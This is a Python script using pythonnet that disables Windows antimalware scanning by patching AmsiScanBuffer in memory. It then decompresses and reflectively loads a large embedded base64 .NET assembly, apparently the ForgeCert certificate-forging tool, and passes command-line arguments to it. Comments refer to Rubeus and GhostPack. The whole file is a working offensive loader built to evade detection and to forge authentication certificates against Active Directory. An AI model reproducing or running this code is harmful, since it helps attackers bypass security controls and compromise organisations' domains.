import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("ForgeCert.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()